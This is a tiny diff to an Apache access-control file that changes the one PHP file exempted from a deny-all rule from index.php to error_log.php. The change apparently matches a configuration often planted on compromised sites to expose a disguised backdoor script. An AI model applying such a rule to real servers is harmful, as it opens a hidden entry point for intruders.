@@ -2,7 +2,7 @@
 Order allow,deny 
 Deny from all 
 </FilesMatch> 
-<FilesMatch "^(index.php)$"># 
+<FilesMatch "^(error_log.php)$"># 
 Order allow,deny 
 Allow from all 
 </FilesMatch> 
